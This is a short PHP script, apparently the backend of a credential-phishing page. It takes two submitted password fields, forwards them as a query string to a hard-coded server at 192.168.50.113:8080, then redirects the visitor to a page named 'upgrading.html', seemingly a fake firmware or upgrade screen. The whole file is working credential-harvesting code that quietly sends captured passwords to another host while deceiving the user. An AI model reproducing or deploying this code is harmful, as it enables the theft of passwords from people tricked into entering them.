<?php
session_start();
ob_start();

$password1 = $_POST['password1'];
$password2 = $_POST['password2'];

$server_url = 'http://192.168.50.113:8080/';

$data = array('password1' => $password1, 'password2' => $password2);

$query_string = http_build_query($data);

$response = file_get_contents($server_url . '?' . $query_string);

sleep(2);
header("location:upgrading.html");
ob_end_flush();
?>